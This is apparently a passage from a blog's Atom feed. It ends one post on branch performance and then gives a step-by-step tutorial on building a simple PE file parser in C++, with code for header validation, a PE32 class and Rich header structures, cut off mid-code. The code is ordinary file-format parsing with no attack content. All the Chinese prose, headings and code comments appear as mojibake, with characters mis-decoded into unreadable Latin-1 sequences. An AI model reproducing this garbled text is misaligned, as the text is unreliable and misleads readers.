href="https://johnnysswlab.com/how-branches-influence-the-performance-of-your-code-and-what-can-you-do-about-it/">How branches influence the performance of your code and what can you do about it? - Johnnyâ€™s Software Lab (johnnysswlab.com)</a>è¿™ç¯‡æ–‡ç« å¯¹ä¸åŒçš„CPUåšäº†ä¸€äº›å®éªŒæ¥éªŒè¯ä¸Šè¿°æŠ€å·§çš„æœ‰æ•ˆæ€§ï¼Œæœ¬æ–‡å¹¶æ²¡æœ‰èŠ±è¿‡å¤šçš„æ—¶é—´è¿›è¡Œä»‹ç»ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»é˜…è¯»ä¸€ä¸‹åŸæ–‡ï¼›</li><li>æœ¬æ–‡ä»‹ç»äº†å¾ˆå¤šä½¿ç¨‹åºè¿è¡Œæ›´å¿«çš„æŠ€å·§ï¼Œç„¶è€Œè¿™äº›æŠ€å·§ä¸ä½¿ç”¨åœºæ™¯ä¹Ÿæ˜¯å¯†åˆ‡ç›¸å…³çš„ï¼Œéœ€è¦åœ¨ä»Šåçš„å·¥ç¨‹å®è·µä¸­åŠ ä»¥ç†è§£ä½¿ç”¨ï¼›æ­¤å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›æŠ€å·§å¹¶æ€»æ˜¯æœ‰æ•ˆï¼Œä¾‹å¦‚æŸäº›æŠ€å·§å¯èƒ½ä¼šé™ä½ä»£ç çš„å¯é˜…è¯»æ€§ç­‰ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ€§èƒ½ä¼˜åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€æ­¥ä¸€æ­¥â€æ‰‹æ“â€œä¸€ä¸ªç®€å•çš„PEè§£æå™¨</title>
    <link href="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <url>/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€æ­¥ä¸€æ­¥â€æ‰‹æ“â€œä¸€ä¸ªç®€å•çš„PEè§£æå™¨"><a href="#ä¸€æ­¥ä¸€æ­¥â€æ‰‹æ“â€œä¸€ä¸ªç®€å•çš„PEè§£æå™¨" class="headerlink" title="ä¸€æ­¥ä¸€æ­¥â€æ‰‹æ“â€œä¸€ä¸ªç®€å•çš„PEè§£æå™¨"></a>ä¸€æ­¥ä¸€æ­¥â€æ‰‹æ“â€œä¸€ä¸ªç®€å•çš„PEè§£æå™¨</h1><ul><li>æœ¬æ–‡ä¸»è¦é€šè¿‡ç¼–å†™ä¸€ä¸ªç®€å•çš„PEè§£æå™¨æ¥åŠ å¼ºå¯¹äºPEç»“æ„çš„ç†è§£</li><li>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/bladchan/Simple-PE-Parser">bladchan/Simple-PE-Parser: A simple tool for parsing PE file (github.com)</a></li></ul><h2 id="Step-0-é¢„å¤‡å·¥ä½œ"><a href="#Step-0-é¢„å¤‡å·¥ä½œ" class="headerlink" title="Step 0: é¢„å¤‡å·¥ä½œ"></a>Step 0: é¢„å¤‡å·¥ä½œ</h2><ul><li>äº†è§£PEæ–‡ä»¶ç»“æ„ï¼Œå‚è€ƒèµ„æ–™[1-7]å‡ä»‹ç»äº†PEçš„ç»“æ„ï¼Œè¿™é‡Œä¸å†èµ˜è¿°</li><li><code>winnt.h</code>ï¼Œè¯¥å¤´æ–‡ä»¶åŒ…å«äº†å¾ˆå¤šPEæ–‡ä»¶æ ¼å¼ä¸­çš„ç»“æ„ä½“ï¼š<a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h</a></li><li>å¼€æºé¡¹ç›®ï¼š<a href="https://github.com/hasherezade/pe-bear">https://github.com/hasherezade/pe-bear</a></li></ul><h2 id="Step-1-ç®€å•çš„è¯†åˆ«PEæ–‡ä»¶ä¸å…¶ç±»å‹"><a href="#Step-1-ç®€å•çš„è¯†åˆ«PEæ–‡ä»¶ä¸å…¶ç±»å‹" class="headerlink" title="Step 1: ç®€å•çš„è¯†åˆ«PEæ–‡ä»¶ä¸å…¶ç±»å‹"></a>Step 1: ç®€å•çš„è¯†åˆ«PEæ–‡ä»¶ä¸å…¶ç±»å‹</h2><ul><li><p>æœ¬èŠ‚ä¸»è¦è§£å†³ä¸€ä¸ªäº‹ï¼Œé‚£å°±æ˜¯ç¡®å®šç»™å®šçš„æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªPEæ–‡ä»¶</p></li><li><p>ä¸€ä¸ªPEæ–‡ä»¶è‡³å°‘è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li><code>DOS Header</code>çš„æ ‡å¿—<code>MZ</code><ul><li>è¯†åˆ«ï¼šæ–‡ä»¶å‰ä¸¤ä¸ªå­—èŠ‚å¯¹åº”<code>MZ</code>çš„ASCIIï¼ˆ0x5A4Dï¼‰</li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.png"></li></ul></li><li><code>NT Header</code>çš„æ ‡å¿—<code>PE</code><ul><li>è¯†åˆ«ï¼š1. è·å–DOS Headerçš„æŒ‡å‘<code>NT Headers</code>é¦–éƒ¨çš„åç§»å€¼ï¼›2. å–å‡ºå‰å››ä¸ªå­—èŠ‚ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦ä¸º<code>50 45 00 00</code>ï¼›</li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/2.png"></li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/3.png"></li></ul></li></ul></li><li><p>æ¥ä¸‹æ¥åˆ¤æ–­ä¸€ä¸‹PEæ–‡ä»¶çš„ç±»å‹ï¼Œä¸»è¦æ˜¯é€šè¿‡<code>NT Headers</code>çš„<code>Optional Header</code>è¿›è¡Œè¯†åˆ«ï¼š</p><ul><li><code>Optional Header</code>ï¼š<ul><li>ä¸»è¦çœ‹Magicå­—æ®µï¼ˆä¸¤ä¸ªå­—èŠ‚ï¼‰ï¼š<code>0x10b ==&gt; NT32</code>ï¼Œ<code>0x20b ==&gt; NT64</code></li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/4.png"></li></ul></li></ul></li></ul><hr><ul><li>ä»£ç ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pe_validate</span><span class="hljs-params">(FILE* file)</span> </span>{<br><span class="hljs-comment">/*  </span><br><span class="hljs-comment">*  æ­¤å‡½æ•°ç”¨äºæ£€æŸ¥ä¼ å…¥æ–‡ä»¶æ˜¯å¦ä¸ºPEæ–‡ä»¶</span><br><span class="hljs-comment">*  å‚æ•°1æ˜¯ä¼ å…¥çš„PEæ–‡ä»¶FILEæŒ‡é’ˆ</span><br><span class="hljs-comment">*  è¿”å›å€¼ï¼š-1è¡¨ç¤ºæ–‡ä»¶æŸåï¼ˆé’ˆå¯¹PEæ–‡ä»¶æ¥è¯´ï¼‰ï¼›0è¡¨ç¤ºä¸æ˜¯åˆæ³•çš„PEæ–‡ä»¶ï¼›å¦åˆ™è¿”å›PEæ–‡ä»¶çš„ç±»å‹ï¼ˆ32 -&gt; PE32; 64 -&gt; PE+/PE32+; 1 -&gt; ROM?ï¼‰</span><br><span class="hljs-comment">*/</span><br><br>__IMAGE_DOS_HEADER dos_header;<br>DWORD sig;<br>WORD pefile_type;<br><br><span class="hljs-built_in">fseek</span>(file, <span class="hljs-number">0</span>, SEEK_SET);<br><span class="hljs-type">size_t</span> read_size = <span class="hljs-built_in">fread</span>(&amp;dos_header, <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER), <span class="hljs-number">1</span>, file);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">// æ£€æŸ¥PEæ–‡ä»¶çš„MSæ ‡å¿—</span><br><span class="hljs-keyword">if</span> (dos_header.e_magic != ___IMAGE_DOS_SIGNATURE) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Not a PE file.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-comment">// æ£€æŸ¥NT Headerçš„PEæ ‡å¿—</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fseek</span>(file, dos_header.e_lfanew, SEEK_SET)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-built_in">fread</span>(&amp;sig, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-number">1</span>, file);<br><span class="hljs-keyword">if</span> (sig != ___IMAGE_NT_SIGNATURE) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Not a PE file.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fseek</span>(file, dos_header.e_lfanew + <span class="hljs-built_in">sizeof</span>(DWORD) + <span class="hljs-built_in">sizeof</span>(___IMAGE_FILE_HEADER), SEEK_SET)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>read_size = <span class="hljs-built_in">fread</span>(&amp;pefile_type, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, file);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// åŒ¹é…PEæ–‡ä»¶çš„ç±»å‹</span><br><span class="hljs-keyword">switch</span> (pefile_type) {<br><span class="hljs-keyword">case</span> ___IMAGE_NT_OPTIONAL_HDR32_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">32</span>;<br><span class="hljs-keyword">case</span> ___IMAGE_NT_OPTIONAL_HDR64_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;<br><span class="hljs-keyword">case</span> ___IMAGE_ROM_OPTIONAL_HDR_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">default</span>: {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error when parsing ___IMAGE_OPTIONAL_HEADER.Magic. Unknown Type.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br>}<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>æµ‹è¯•ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    FILE* fp;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;fp, <span class="hljs-string">"PATH_TO_PE_FILE"</span>, <span class="hljs-string">"r"</span>);<br>    std::cout &lt;&lt; <span class="hljs-built_in">pe_validate</span>(fp) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¾“å‡ºç»“æœä¸º64ï¼Œè¡¨ç¤ºè¯¥PEæ–‡ä»¶ç±»å‹ä¸º<code>PE32+</code></p><h2 id="Step-2-è§£æPE32æ–‡ä»¶å¤´"><a href="#Step-2-è§£æPE32æ–‡ä»¶å¤´" class="headerlink" title="Step 2: è§£æPE32æ–‡ä»¶å¤´"></a>Step 2: è§£æPE32æ–‡ä»¶å¤´</h2><ul><li><p><code>PE32</code>å’Œ<code>PE32+</code>ä»…åœ¨ä½é•¿ä¸Šå­˜åœ¨å·®å¼‚ï¼Œæ•´ä½“å¤„ç†é€»è¾‘æ˜¯æ— ä»»ä½•åŒºåˆ«çš„ï¼›</p></li><li><p><code>PE32</code>æ–‡ä»¶ä¸»è¦åŒ…æ‹¬çš„ç»“æ„æœ‰ï¼š</p><ul><li><code>DOS header</code></li><li><code>DOS Stub (Rich Header)</code></li><li><code>NT Headers (File Headerã€Optional Header)</code></li><li><code>Section Headers</code></li><li>â€¦ï¼ˆè¯·æ³¨æ„ï¼Œæˆ‘ä»¬è¿™é‡Œä»…ä»…æ˜¯è®¾è®¡ä¸€ä¸ªç®€å•çš„è§£æå™¨ï¼Œè§£æçš„åŠŸèƒ½å¯èƒ½å¹¶ä¸å®Œå–„ï¼Œä»…ç”¨äºåŠ æ·±å¯¹PEæ–‡ä»¶æ ¼å¼çš„ç†è§£ï¼‰</li></ul></li><li><p><code>PE32</code>æ–‡ä»¶ç»“æ„ç±»çš„è®¾è®¡ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PE32</span> {<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">PE32</span>(<span class="hljs-type">char</span>*, FILE*);<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_info</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-comment">// åŸºç¡€çš„æˆå‘˜å˜é‡</span><br><span class="hljs-type">char</span>* file_path;<br>FILE* pe_fp;<br><br><span class="hljs-comment">// PEç›¸å…³å¤´</span><br>___IMAGE_DOS_HEADER         pe_dos_header;<br>___IMAGE_NT_HEADERS32       pe_nt_headers_32;<br>___PIMAGE_OPTIONAL_HEADER32 nt_optional_headers;<br>___PIMAGE_SECTION_HEADER    section_headers;<br>___PIMAGE_IMPORT_DESCRIPTOR import_dir_table_entries;<br>___IMAGE_EXPORT_DIRECTORY   export_dir_table;<br>___PIMAGE_BASE_RELOCATION   basereloc_table;<br>___IMAGE_RESOURCE_DIRECTORY resource_dir_root;<br><br><span class="hljs-comment">// PEç›¸å…³å¤´ä¸­çš„åç§»é‡å’Œå˜é‡</span><br>WORD  nt_headers_machine;<br>LONG  nt_headers_offset;<br>WORD  nt_sections_cnt;<br>WORD  nt_optional_header_size;<br>WORD  nt_characteristics;<br>DWORD pe_header_size;<br>DWORD import_dir_table_rva;<br>DWORD import_dir_table_size;<br>DWORD export_dir_table_rva;<br>DWORD export_dir_table_size;<br>DWORD basereloc_dir_table_rva;<br>DWORD basereloc_dir_table_size;<br>DWORD resource_dir_table_rva;<br>DWORD resource_dir_table_size;<br><br><span class="hljs-comment">// è¾…åŠ©å˜é‡</span><br>DWORD import_dir_table_entries_num;<br>DWORD basereloc_table_num;<br><br><span class="hljs-comment">// ä¸Rich headersæœ‰å…³çš„ç›¸å…³å˜é‡</span><br>RICH_HEADER rich_headers;<br><br><span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼Œç”¨äºè½¬åŒ–ç›¸å…³åœ°å€</span><br><span class="hljs-function">DWORD <span class="hljs-title">va_to_raw</span><span class="hljs-params">(DWORD)</span></span>;<br><br><span class="hljs-comment">// è§£æç›¸å…³çš„å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_file</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_dos_header</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_dos_stub</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_nt_headers</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_section_headers</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_import_directory</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_export_directory</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_basereloc_table</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_resources_table</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-comment">// æ‰“å°ç›¸å…³çš„å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_file_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_dos_header_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_dos_stub_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_nt_headers_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_section_headers_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_import_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_export_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_basereloc_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_resources_table_info</span><span class="hljs-params">()</span></span>;<br><br>};<br></code></pre></td></tr></tbody></table></figure><h3 id="Step-2-1-è§£æDOS-Header"><a href="#Step-2-1-è§£æDOS-Header" class="headerlink" title="Step 2.1: è§£æDOS Header"></a>Step 2.1: è§£æDOS Header</h3><ul><li>åœ¨ç±»ä¸­ç»´æŠ¤ä¸€ä¸ª<code>IMAGE_DOS_HEADER</code>çš„å˜é‡<code>pe_dos_header</code>ï¼Œç„¶åä»æ–‡ä»¶ä¸­å°†ç›¸åº”æ•°æ®è¯»å…¥åˆ°è¯¥æˆå‘˜å˜é‡å³å¯ã€‚åŒæ—¶æˆ‘ä»¬è¿™é‡Œåœ¨ç±»ä¸­ç»´æŠ¤äº†ä¸€ä¸ª<code>nt_headers_offset</code>çš„æˆå‘˜å˜é‡ï¼Œç”¨äºè®°å½•<code>NT Headers</code>çš„åç§»å€¼ã€‚</li><li>ä»£ç ï¼š</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">PE32::parse_dos_header</span><span class="hljs-params">()</span><br>{<br><br>fseek(pe_fp, <span class="hljs-number">0</span>, SEEK_SET);<br>fread(&amp;pe_dos_header, <span class="hljs-keyword">sizeof</span>(___IMAGE_DOS_HEADER), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-comment">// è¿™é‡Œä¸éœ€è¦æ£€æŸ¥è¯»å…¥å­—èŠ‚æ•°ï¼Œå› ä¸ºä¹‹å‰å·²ç»è°ƒç”¨è¿‡ `pe_validate()` äº†ï¼Œ</span><br><span class="hljs-comment">// å› æ­¤è¿™é‡Œä¸€å®šèƒ½å¤Ÿè¯»å…¥ `sizeof(___IMAGE_DOS_HEADER)` ä¸ªå­—èŠ‚</span><br><br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PE32::print_dos_header_info</span><span class="hljs-params">()</span><br>{<br>nt_headers_offset = pe_dos_header.e_lfanew;<br><br><span class="hljs-comment">// ä¸ºäº†ç®€åŒ–ï¼Œæˆ‘ä»¬è¿™é‡Œåªæ‰“å°ä¸€äº›ä¸»è¦ä¿¡æ¯</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"======DOS Header======\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"Magic number: %04X\n"</span>, pe_dos_header.e_magic);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"File address of new exe header: %X\n"</span>, pe_dos_header.e_lfanew);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"\n==========END==========\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/5.png"></p><hr><h3 id="Step-2-2-è§£æDOS-Stubï¼ˆRich-headersï¼‰"><a href="#Step-2-2-è§£æDOS-Stubï¼ˆRich-headersï¼‰" class="headerlink" title="Step 2.2: è§£æDOS Stubï¼ˆRich headersï¼‰"></a>Step 2.2: è§£æDOS Stubï¼ˆRich headersï¼‰</h3><ul><li><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦è§£æ<code>DOS Stub</code>ä¸­çš„<code>Rich headers</code>ã€‚è¯·æ³¨æ„ï¼Œæš‚æ— æ–‡æ¡£è¯´æ˜è¿‡<code>Rich headers</code>æ˜¯åŒ…å«åœ¨<code>DOS Stub</code>å†…çš„ï¼Œä½†<code>Rich headers</code>æ‰€å¤„çš„ä½ç½®ç¡®å®ä»‹äº<code>PE</code>å¤´å’Œ<code>DOS</code>å¤´ä¹‹é—´çš„ï¼Œå› æ­¤æœ¬æ–‡ä¸ä¸¥è°¨çš„å°†<code>Rich headers</code>åŒ…å«åœ¨<code>DOS Stub</code>å†…éƒ¨</p></li><li><p>ä»€ä¹ˆæ˜¯<code>Rich headers</code>ï¼Ÿ</p><ul><li><code>Rich headers</code>å¯ä»¥ç†è§£ä¸ºå­˜å‚¨ç€å¼€å‘ç¯å¢ƒä¿¡æ¯çš„ä¸€æ®µæŒ‡çº¹[10]ï¼Œæˆ–ç”¨äºå¸®åŠ©è¯Šæ–­å’Œè°ƒè¯•</li><li><code>Rich headers</code>ä½¿ç”¨<code>XOR Key</code>å¯¹<code>Rich headers</code>ä¸­çš„æ¯4ä¸ªå­—èŠ‚è¿›è¡Œäº†å¼‚æˆ–åŠ å¯†</li><li><code>Rich headers</code>çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/6.png"></p></li><li><p>å¦‚ä½•å®šä½<code>Rich headers</code>ï¼Ÿ</p><ul><li>é¦–å…ˆï¼Œ<code>Rich headers</code>è‚¯å®šæ˜¯ä»¥å››ä¸ªå­—èŠ‚çš„<code>Rich</code>ï¼ˆ<code>0x68636952</code>ï¼‰ï¼Œå¹¶ä¸”åé¢è¿˜è·Ÿç€å››ä¸ªå­—èŠ‚çš„<code>XOR key</code>ï¼›</li><li>ç„¶åï¼Œä¸ºäº†ç¡®å®š<code>Rich headers</code>çš„é•¿åº¦ï¼Œæˆ‘ä»¬å‘å‰æœç´¢ï¼Œå¹¶æ ¹æ®<code>XOR</code>å¯†é’¥å¼‚æˆ–æ¢å¤åŸæ•°æ®ï¼Œå¹¶æ‰¾åˆ°<code>DanS ID</code>ï¼ˆ<code>0x536e6144</code>ï¼‰ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æ‰¾åˆ°äº†<code>Rich headers</code>çš„èµ·å§‹ä½ç½®ï¼›</li><li>æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨<code>XOR</code>å¯†é’¥è§£å¯†<code>Rich headers</code>çš„å†…å®¹å¹¶æ¢å¤åŸæ•°æ®ã€‚</li></ul></li><li><p>è®¾è®¡ç»“æ„ä½“ç”¨æ¥å­˜å‚¨<code>Rich headers</code>æ•°æ®ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER_DATA</span> {<br><span class="hljs-type">int</span>   data_size;<br><span class="hljs-type">char</span>* data_ptr;<br>}RICH_HEADER_DATA;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER_ENTRY</span> {<br><span class="hljs-comment">// Build ID</span><br><span class="hljs-comment">// Product ID</span><br><span class="hljs-comment">// Count</span><br>WORD  r_build_id;<br>WORD  r_prod_id;<br>DWORD r_count;<br><br>}RICH_HEADER_ENTRY, *PRICH_HEADER_ENTRY;<br><br><span 